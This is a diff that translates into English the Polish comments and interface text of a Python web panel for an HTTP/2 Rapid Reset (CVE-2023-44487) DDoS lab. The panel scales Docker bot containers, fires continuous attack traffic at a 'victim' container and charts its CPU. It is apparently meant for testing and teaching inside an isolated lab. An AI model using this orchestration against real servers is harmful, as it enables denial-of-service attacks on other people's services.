@@ -1,28 +1,29 @@
 #!/usr/bin/env python3
 """
-Panel sterowania flota botow (HTTP/2 Rapid Reset lab) + podglad na zywo.
+Bot fleet control panel (HTTP/2 Rapid Reset lab) + live monitoring.
 
-Dziala w kontenerze z zamontowanym /var/run/docker.sock. Zarzadza WLASNA pula
-kontenerow-botow (nazwy gui-bot-N, etykieta lab-gui-bot=1) przez Docker CLI:
-suwak = ile botow ma dzialac; Fire = odpal ruch na calej puli; Stop = przerwij.
+Runs in a container with /var/run/docker.sock mounted. Manages its OWN pool of
+bot containers (names gui-bot-N, label lab-gui-bot=1) via Docker CLI:
+slider = how many bots should be running; Fire = launch traffic on the entire pool;
+Stop = halt.
 
-GRANICA (bez zmian wzgledem reszty labu): zarzadza wylacznie wlasnymi, z gory
-zbudowanymi kontenerami tego labu (obraz BOT_IMAGE, rapidreset/h2load wbudowane).
-Brak dystrybucji/implantacji ataku na urzadzenia, ktore go nie maja.
+BOUNDARY (unchanged from the rest of the lab): manages only its own, pre-built
+containers of this lab (image BOT_IMAGE, rapidreset/h2load built-in).
+No distribution/implantation of the attack to devices that don't have it.
 
-Monitoring (CPU/polaczenia ofiary w czasie) ogladasz w Zabbixie; panel pokazuje
-tez lekki podglad (liczba botow + CPU ofiary z `docker stats`).
+Monitoring (CPU/victim connections over time) is viewed in Zabbix; the panel also
+shows a lightweight overview (number of bots + victim CPU from `docker stats`).
 
-Tylko biblioteka standardowa. Konfiguracja przez zmienne srodowiskowe:
-  LABNET      siec docker, do ktorej podpinane sa boty (domyslnie ddos-lab_labnet)
-  BOT_IMAGE   obraz bota (domyslnie ddos-lab-botfleet:latest)
-  VICTIM      host:port ofiary dla rapidreset (domyslnie victim:443)
-  BOT_CPUSET  cpuset dla botow (domyslnie 2-11)
-  BOT_CPUS    limit CPU na bota (domyslnie 0.1)
-  VICTIM_CTR  nazwa kontenera ofiary dla `docker stats` (domyslnie lab-victim)
-  ZABBIX_URL  link do frontendu Zabbix pokazywany w panelu (domyslnie http://localhost:8080)
-  PORT        port panelu (domyslnie 8090)
-  MAX_BOTS    gorny limit suwaka (domyslnie 100)
+Standard library only. Configuration via environment variables:
+  LABNET      docker network that bots are attached to (default ddos-lab_labnet)
+  BOT_IMAGE   bot image (default ddos-lab-botfleet:latest)
+  VICTIM      host:port of the victim for rapidreset (default victim:443)
+  BOT_CPUSET  cpuset for bots (default 2-11)
+  BOT_CPUS    CPU limit per bot (default 0.1)
+  VICTIM_CTR  victim container name for `docker stats` (default lab-victim)
+  ZABBIX_URL  link to Zabbix frontend shown in the panel (default http://localhost:8080)
+  PORT        panel port (default 8090)
+  MAX_BOTS    slider upper limit (default 100)
 """
 import json
 import os
@@ -42,14 +43,11 @@ MAX_BOTS = int(os.environ.get("MAX_BOTS", "100"))
 
 NAME_RE = re.compile(r"^gui-bot-(\d+)$")
 
-# Stan ostatniego Fire ("attack"|"legit") albo None po Stop. Trzymany w apce,
-# zeby /api/status bylo O(1) (jeden `docker stats` + jeden `docker ps`) zamiast
-# odpytywac pgrep w kazdym z potencjalnie 100 botow na kazdy poll.
 ATTACK_MODE = None
 
 
 def docker(*args, timeout=30):
-    """Wywolaj docker CLI; zwroc (rc, stdout, stderr)."""
+    """Call docker CLI; return (rc, stdout, stderr)."""
     try:
         p = subprocess.run(
             ["docker", *args],
@@ -80,7 +78,7 @@ def create_bot(i):
         "run", "-d",
         "--name", f"gui-bot-{i}",
         "--label", "lab-gui-bot=1",
-        "--init",            # PID1=docker-init (tini) reapuje zabite workery -> brak zombie
+        "--init",
         "--network", LABNET,
         "--cpuset-cpus", BOT_CPUSET,
         "--cpus", BOT_CPUS,
@@ -93,7 +91,7 @@ def remove_bot(i):
 
 
 def scale(n):
-    """Doprowadz pule do dokladnie n botow (gui-bot-1..n)."""
+    """Bring the pool to exactly n bots (gui-bot-1..n)."""
     n = max(0, min(MAX_BOTS, int(n)))
     present = set(running_bot_indices())
     desired = set(range(1, n + 1))
@@ -116,7 +114,7 @@ def single_cmd(mode, requests, concurrency):
 
 
 def fire(mode, requests, concurrency, duration):
-    """Stop-then-start ruchu na calej puli (idempotentne re-arming)."""
+    """Stop-then-start traffic on the entire pool (idempotent re-arming)."""
     global ATTACK_MODE
     if mode not in ("attack", "legit"):
         return {"error": "bad mode"}
@@ -127,7 +125,7 @@ def fire(mode, requests, concurrency, duration):
         loop = (f"end=$(( $(date +%s) + {dur} )); "
                 f"while [ $(date +%s) -lt $end ]; do {single}; done")
     else:
-        loop = f"while true; do {single}; done"  # ciagly do Stop
+        loop = f"while true; do {single}; done"
     idx = running_bot_indices()
     for i in idx:
         docker("exec", "-d", f"gui-bot-{i}", "sh", "-c", loop)
@@ -135,13 +133,6 @@ def fire(mode, requests, concurrency, duration):
     return {"fired": len(idx), "mode": mode}
 
 
-# Ubij procesy ruchu w kontenerze, zachowujac przy zyciu:
-#   - PID 1 (docker-init/tini, dzieki --init),
-#   - sam wykonujacy to shell ($$),
-#   - `sleep infinity` (keepalive = glowne dziecko tini; jego smierc ubilaby kontener).
-# To zdejmuje petle `while true; do rapidreset...; done` ORAZ biezace workery.
-# `pkill -f rapidreset` NIE dziala - dopasowalby i zabil wlasny exec (jego
-# cmdline zawiera "rapidreset"). Osierocone workery reapuje tini -> brak zombie.
 _KILL_ALL = (
     'for d in /proc/[0-9]*; do '
     'pid=${d#/proc/}; '
@@ -165,8 +156,6 @@ def stop_all():
 
 def status():
     idx = running_bot_indices()
-    # bots_busy liczymy ze stanu apki (ATTACK_MODE), nie przez pgrep per-bot -
-    # inaczej przy 100 botach bylby to 100 exec-ow na kazdy poll co 2s.
     busy = len(idx) if ATTACK_MODE else 0
     rc, out, _ = docker("stats", "--no-stream", "--format", "{{.CPUPerc}}", VICTIM_CTR)
     victim_cpu = out.replace("%", "") if rc == 0 and out else None
@@ -180,7 +169,7 @@ def status():
 
 
 PAGE = """<!doctype html>
-<html lang="pl"><head><meta charset="utf-8">
+<html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Botnet Lab - panel</title>
 <style>
@@ -208,22 +197,22 @@ a{color:#4da3ff}
 canvas{width:100%;height:160px;display:block;background:#0f1420;border:1px solid #2a3550;border-radius:10px}
 .zbtn{display:inline-block;background:#4da3ff;color:#06111f;padding:10px 18px;border-radius:9px;font-weight:700;text-decoration:none}
 </style></head><body><div class="wrap">
-<h1>Botnet Lab &mdash; panel sterowania</h1>
-<p class="sub">HTTP/2 Rapid Reset (CVE-2023-44487) &middot; cel: <code>__VICTIM__</code> &middot;
-monitoring na zywo w <a href="__ZBX__" target="_blank">Zabbixie</a></p>
+<h1>Botnet Lab &mdash; control panel</h1>
+<p class="sub">HTTP/2 Rapid Reset (CVE-2023-44487) &middot; target: <code>__VICTIM__</code> &middot;
+live monitoring in <a href="__ZBX__" target="_blank">Zabbix</a></p>
 
 <div class="card">
   <div class="row" style="justify-content:space-between">
-    <div><label>Rozmiar botnetu</label><div class="big"><span id="slval">0</span> <span class="muted">botow</span></div></div>
-    <div style="text-align:right"><span class="muted">cel: <span id="sltarget">0</span></span></div>
+    <div><label>Botnet size</label><div class="big"><span id="slval">0</span> <span class="muted">bots</span></div></div>
+    <div style="text-align:right"><span class="muted">target: <span id="sltarget">0</span></span></div>
   </div>
   <input type="range" id="slider" min="0" max="__MAX__" value="0" step="1">
-  <div class="muted">Przesun suwak &rarr; pula botow sama sie skaluje (kontenery gui-bot-N na sieci labnet).</div>
+  <div class="muted">Move the slider &rarr; the bot pool scales automatically (gui-bot-N containers on labnet).</div>
 </div>
 
 <div class="card">
   <div class="row">
-    <div><label>Tryb ruchu</label><br>
+    <div><label>Traffic mode</label><br>
       <select id="mode">
         <option value="attack">attack (Rapid Reset)</option>
         <option value="legit">legit (h2load)</option>
@@ -235,31 +224,31 @@ monitoring na zywo w <a href="__ZBX__" target="_blank">Zabbixie</a></p>
       <button class="stop" id="stopBtn">&#9632; Stop</button>
     </div>
   </div>
-  <div class="muted" style="margin-top:8px">Fire = restart ruchu na calej aktualnej puli (tryb ciagly do Stop).
-  Po zmianie suwaka w trakcie ataku kliknij Fire ponownie, aby dozbroic nowe boty.</div>
+  <div class="muted" style="margin-top:8px">Fire = restart traffic on the entire current pool (continuous mode until Stop).
+  After changing the slider during an attack, click Fire again to arm the new bots.</div>
 </div>
 
 <div class="card"><div class="row">
-  <div class="stat"><div class="k">Boty w puli</div><div class="v" id="stBots">0</div></div>
-  <div class="stat"><div class="k">Boty atakujace</div><div class="v" id="stBusy">0</div></div>
-  <div class="stat"><div class="k">CPU ofiary</div><div class="v" id="stCpu">&mdash;</div></div>
-  <div class="stat"><div class="k">Status</div><div class="v" id="stState" style="font-size:16px"><span class="dot" style="background:#8aa0b4"></span>bezczynny</div></div>
+  <div class="stat"><div class="k">Bots in pool</div><div class="v" id="stBots">0</div></div>
+  <div class="stat"><div class="k">Bots attacking</div><div class="v" id="stBusy">0</div></div>
+  <div class="stat"><div class="k">Victim CPU</div><div class="v" id="stCpu">&mdash;</div></div>
+  <div class="stat"><div class="k">Status</div><div class="v" id="stState" style="font-size:16px"><span class="dot" style="background:#8aa0b4"></span>idle</div></div>
 </div></div>
 
 <div class="card">
   <div class="row" style="justify-content:space-between;margin-bottom:10px">
-    <strong>CPU ofiary &mdash; podglad na zywo</strong>
-    <span class="muted">ostatnie ~2 min (poll co 2s)</span>
+    <strong>Victim CPU &mdash; live view</strong>
+    <span class="muted">last ~2 min (poll every 2s)</span>
   </div>
   <canvas id="cpuChart" width="860" height="160"></canvas>
   <div class="row" style="justify-content:space-between;margin-top:12px">
-    <span class="muted">Pelny monitoring (CPU, polaczenia nginx, load, siec, historia) w Zabbixie:<br>
+    <span class="muted">Full monitoring (CPU, nginx connections, load, network, history) in Zabbix:<br>
     Monitoring &rarr; Latest data &rarr; host <code>victim</code>.</span>
-    <a class="zbtn" href="__ZBX__" target="_blank">Otworz Zabbix &#8599;</a>
+    <a class="zbtn" href="__ZBX__" target="_blank">Open Zabbix &#8599;</a>
   </div>
 </div>
 
-<p class="muted">Panel steruje wlasna pula botow tego labu. Nie wgrywa niczego na zewnetrzne hosty.</p>
+<p class="muted">This panel controls its own bot pool of this lab. It does not deploy anything to external hosts.</p>
 </div>
 <script>
 const $ = id => document.getElementById(id);
@@ -289,16 +278,14 @@ $('fireBtn').addEventListener('click', ()=>{
 });
 $('stopBtn').addEventListener('click', ()=>post('/api/stop',{}));
 
-const cpuHist = [];           // historia CPU% ofiary (ostatnie ~60 probek)
+const cpuHist = [];
 const MAXPTS = 60;
 
 function drawChart(){
   const c = $('cpuChart'); const ctx = c.getContext('2d');
   const W = c.width, H = c.height, pad = 24;
   ctx.clearRect(0,0,W,H);
-  // skala: 0..max(100, szczyt)
   const peak = Math.max(100, ...cpuHist);
-  // siatka pozioma
   ctx.strokeStyle = '#2a3550'; ctx.fillStyle = '#8aa0b4'; ctx.lineWidth = 1; ctx.font = '11px system-ui';
   [0,0.5,1].forEach(f=>{
     const y = H-pad - f*(H-2*pad);
@@ -323,7 +310,7 @@ async function poll(){
     const cpu = s.victim_cpu!=null ? parseFloat(s.victim_cpu) : null;
     $('stCpu').textContent = cpu!=null ? cpu.toFixed(1)+'%' : '—';
     const busy = s.bots_busy>0;
-    const lbl = busy ? ('ruch: '+(s.mode||'?')) : 'bezczynny';
+    const lbl = busy ? ('traffic: '+(s.mode||'?')) : 'idle';
     $('stState').innerHTML = '<span class="dot" style="background:'+(busy?'#ff5a5a':'#3ddc84')+'"></span>'+lbl;
     if(cpu!=null){ cpuHist.push(cpu); while(cpuHist.length>MAXPTS) cpuHist.shift(); drawChart(); }
     if(document.activeElement!==$('slider')){ $('slider').max = s.max_bots; }
@@ -383,10 +370,10 @@ class Handler(BaseHTTPRequestHandler):
         else:
             self._send(404, json.dumps({"error": "not found"}))
 
-    def log_message(self, *a):  # cisza w logach
+    def log_message(self, *a):
         pass
 
 
 if __name__ == "__main__":
-    print(f"[gui] panel na :{PORT}  labnet={LABNET}  image={BOT_IMAGE}  cel={VICTIM}")
+    print(f"[gui] panel on :{PORT}  labnet={LABNET}  image={BOT_IMAGE}  target={VICTIM}")
     ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
